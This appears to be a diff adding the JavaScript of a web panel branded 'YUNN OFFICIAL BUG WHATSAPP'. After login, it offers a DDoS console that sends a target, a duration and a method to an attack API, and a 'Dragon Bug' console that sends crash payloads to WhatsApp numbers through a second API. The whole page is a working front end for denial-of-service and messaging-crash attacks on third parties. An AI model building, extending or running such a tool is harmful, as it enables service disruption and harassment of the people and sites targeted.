+    const introOverlay = document.getElementById("intro-text-overlay");
+    const introText = document.getElementById("intro-text-content");
+
+    // Hide all main views during intro
+    views.forEach(view => view.style.display = 'none');
+  
+    introOverlay.style.display = "flex"; 
+
+    document.getElementById('loading-sound').play().catch(error => {
+        console.warn("Autoplay was prevented by the browser.");
+    });
+    
+    setTimeout(() => {
+        introText.style.fontSize = "2rem";
+        introText.textContent = "HAI WELCOME TO WEBSITE";
+    }, 1000);
+
+    setTimeout(() => {
+        introText.style.fontSize = "2rem";
+        introText.textContent = "YUNN OFFICIAL BUG WHATSAPP";
+    }, 3000);
+
+    // When the animation on the overlay is done, run the callback
+    setTimeout(() => {
+        introOverlay.style.display = "none";
+        if (onComplete) {
+            onComplete();
+        }
+    }, 5500); // Matches the fadeInOut animation duration
+}
+
+
+function showPopup(message) {
+  document.getElementById("popup-message").innerHTML = message;
+  document.getElementById("popup").style.display = "flex";
+}
+
+function closePopup() {
+  document.getElementById("popup").style.display = "none";
+}
+
+function toggleMusic() {
+  const bgMusic = document.getElementById("bg-music");
+  const musicToggle = document.getElementById("music-toggle");
+  if (bgMusic.paused) {
+    bgMusic.play();
+    musicToggle.innerHTML = '<i class="fas fa-pause"></i>';
+  } else {
+    bgMusic.pause();
+    musicToggle.innerHTML = '<i class="fas fa-music"></i>';
+  }
+}
+
+function showDashboard(user) {
+  showView('bug-box'); // Default to bug console after login
+  userLabel.innerHTML = `<i class="fas fa-user-ninja"></i> ${user.username}`;
+  document.getElementById("music-player").style.display = "block";
+  menuToggle.style.display = 'block'; // MODIFICATION: Show the menu toggle
+}
+
+function resetLoginForm() {
+  usernameInput.value = "";
+  passwordInput.value = "";
+  loginResult.innerText = "";
+}
+
+// --- DDoS-SPECIFIC FUNCTIONS ---
+function createDDoSMethodButtons() {
+    const container = document.getElementById('ddosMethodSelector');
+    container.innerHTML = '';
+    
+    ddosMethods.forEach(method => {
+        const btn = document.createElement('div');
+        btn.className = 'method-btn';
+        btn.textContent = method;
+        btn.onclick = () => {
+            document.querySelector('#ddosMethodSelector .method-btn.active')?.classList.remove('active');
+            btn.classList.add('active');
+            selectedDDoSMethod = method;
+        };
+        
+        if (method === selectedDDoSMethod) {
+            btn.classList.add('active');
+        }
+        
+        container.appendChild(btn);
+    });
+}
+
+async function launchAttack() {
+    const target = ddosTargetInput.value.trim();
+    const time = ddosTimeInput.value.trim();
+    
+    if (!target || !time) {
+        ddosResultDiv.textContent = 'Please fill all fields';
+        ddosResultDiv.className = 'result-message error';
+        return;
+    }
+    
+    if (time < 10 || time > 600) {
+        ddosResultDiv.textContent = 'Duration must be between 10-600 seconds';
+        ddosResultDiv.className = 'result-message error';
+        return;
+    }
+    
+    attackBtn.disabled = true;
+    attackBtn.innerHTML = '<span class="spinner"></span> ATTACKING...';
+    ddosResultDiv.textContent = '';
+    ddosResultDiv.className = 'result-message';
+    
+    try {
+        const apiUrl = `${DDOS_API_ENDPOINT}target=${encodeURIComponent(target)}&time=${time}&methods=${selectedDDoSMethod}`;
+        const response = await fetch(apiUrl);
+        
+        if (!response.ok) {
+            throw new Error(`Server responded with status ${response.status}`);
+        }
+        
+        const data = await response.json();
+        
+        if (data.error) {
+            throw new Error(data.message || 'Attack failed');
+        }
+        
+        ddosResultDiv.textContent = 'DDoS attack launched successfully!';
+        ddosResultDiv.className = 'result-message success';
+        showPopup(`DDoS attack launched successfully against <b>${target}</b>!`);
+    } catch (error) {
+        console.error('Attack error:', error);
+        ddosResultDiv.textContent = `Error: ${error.message}`;
+        ddosResultDiv.className = 'result-message error';
+    } finally {
+        attackBtn.disabled = false;
+        attackBtn.innerHTML = '<i class="fas fa-rocket"></i> LAUNCH ATTACK';
+    }
+}
+
+// --- BUG-SPECIFIC FUNCTIONS ---
+async function sendBug() {
+  const target = bugTargetInput.value.trim();
+
+  if (!/^\d+(@s\.whatsapp\.net)?$/.test(target)) {
+    bugResultDiv.innerText = "Please enter a valid WhatsApp number (e.g., 628123456789)";
+    bugResultDiv.className = "result-message error";
+    return;
+  }
+
+  const chatId = `${target.split('@')[0]}@s.whatsapp.net`;
+
+  sendBugBtn.disabled = true;
+  sendBugBtn.innerHTML = '<span class="spinner"></span> Sending...';
+  bugResultDiv.innerText = "";
+
+  try {
+    const url = `${BUG_API_ENDPOINT}type=${selectedBug}&chatId=${chatId}`;
+    const res = await fetch(url, { method: 'GET' });
+
+    if (!res.ok) throw new Error(`Server responded with status ${res.status}`);
+    const data = await res.json();
+    if (data.error) throw new Error(data.message || "Unknown error from server");
+
+    showPopup(`Dragon Bug successfully sent to <b>${target}</b>`);
+    bugResultDiv.innerText = "Bug sent successfully!";
+    bugResultDiv.className = "result-message success";
+  } catch (err) {
+    console.error("Error sending bug:", err);
+    bugResultDiv.innerText = `❌ Failed to send bug: ${err.message}`;
+    bugResultDiv.className = "result-message error";
+    showPopup(`Failed to send bug to ${target}<br><small>${err.message}</small>`);
+  } finally {
+    sendBugBtn.disabled = false;
+    sendBugBtn.innerHTML = '<i class="fas fa-bug"></i> Kirim Bug';
+  }
+}
+
+// --- EVENT HANDLERS ---
+async function login() {
+  const username = usernameInput.value.trim();
+  const password = passwordInput.value.trim();
+
+  if (!username || !password) {
+    loginResult.innerText = "Please enter both username and password";
+    loginResult.className = "result-message error";
+    return;
+  }
+
+  if (usersData.length === 0) await fetchUsers();
+
+  const user = usersData.find(u => u.username === username && u.password === password);
+
+  if (user) {
+    playIntroSequence(() => {
+        saveSession(user);
+        showDashboard(user);
+    });
+  } else {
+    loginResult.innerText = "❌ Invalid username or password";
+    loginResult.className = "result-message error";
+  }
+}
+
+function logout() {
+  clearSession();
+  showView('login-box');
+  resetLoginForm();
+  document.getElementById("music-player").style.display = "none";
+  menuToggle.style.display = 'none'; // MODIFICATION: Hide the menu toggle on logout
+}
+
+// --- INITIALIZATION ---
+window.addEventListener("load", async () => {
+  // Pre-fetch users data & create DDoS buttons
+  await fetchUsers();
+  createDDoSMethodButtons();
+
+  // Check for existing session
+  const user = getSession();
+  if (user) {
+    showDashboard(user);
+  } else {
+    showView('login-box');
+  }
+
+  // Hide loading screen
+  setTimeout(() => {
+      const loader = document.getElementById("loading-screen");
+      if (loader) {
+        loader.style.opacity = "0";
+        setTimeout(() => {
+          loader.style.display = "none";
+        }, 800); // Corresponds to transition duration
+      }
+    }, 2000);
+});
+
+// --- EVENT LISTENERS ---
+loginBtn.addEventListener('click', login);
+sendBugBtn.addEventListener('click', sendBug);
+attackBtn.addEventListener('click', launchAttack);
+
+// Logout buttons
+document.getElementById('logoutBtnBug').addEventListener('click', logout);
+document.getElementById('logoutBtnDdos').addEventListener('click', logout);
+
+// Bug selector dropdown logic
+const bugSelectorDisplay = document.getElementById("bug-selector-display");
+const bugOptionsList = document.getElementById("bug-options-list");
+const selectedBugInfo = document.getElementById("selected-bug-info");
+
+bugSelectorDisplay.addEventListener('click', (e) => {
+    e.stopPropagation();
+    const isOpen = bugOptionsList.style.display === 'block';
+    bugOptionsList.style.display = isOpen ? 'none' : 'block';
+    bugSelectorDisplay.classList.toggle('open', !isOpen);
+});
+
+document.querySelectorAll(".bug-option").forEach(option => {
+    option.addEventListener("click", () => {
+        selectedBug = option.getAttribute("data-bug");
+        const iconHTML = option.querySelector('i').outerHTML;
+        const nameText = option.querySelector('span').textContent;
+        selectedBugInfo.innerHTML = `${iconHTML} <span id="selected-bug-name">${nameText}</span>`;
+        document.querySelector('.bug-option.active')?.classList.remove('active');
+        option.classList.add('active');
+        bugOptionsList.style.display = 'none';
+        bugSelectorDisplay.classList.remove('open');
+    });
+});
+
+window.addEventListener('click', () => {
+    if (bugOptionsList.style.display === 'block') {
+        bugOptionsList.style.display = 'none';
+        bugSelectorDisplay.classList.remove('open');
+    }
+});
+
+// Menu Toggle Functionality
+menuToggle.addEventListener("click", () => sideMenu.classList.toggle("open"));
+
+// Menu Link Functionality
+document.querySelectorAll(".menu-link").forEach(link => {
+    link.addEventListener("click", (e) => {
+        const targetId = link.getAttribute("href");
+        if (targetId.startsWith("#")) {
+            e.preventDefault();
+            const viewId = targetId.substring(1);
+            
+            if (viewId === "bug-box" || viewId === "ddos-box" || viewId === "ai-assistant-box") {
+                if (getSession()) {
+                    showView(viewId);
+                } else {
+                    showPopup("You need to log in to access the consoles.");
+                }
+            } else {
+                showView(viewId);
+            }
+            sideMenu.classList.remove("open");
+        }
+    });
+});
+
+// Add keyboard support for login
+document.addEventListener("keypress", (e) => {
+  if (e.key === "Enter" && loginBox.style.display !== "none") {
+    login();
+  }
+});
+
+    </script>
+</body>
+</html>
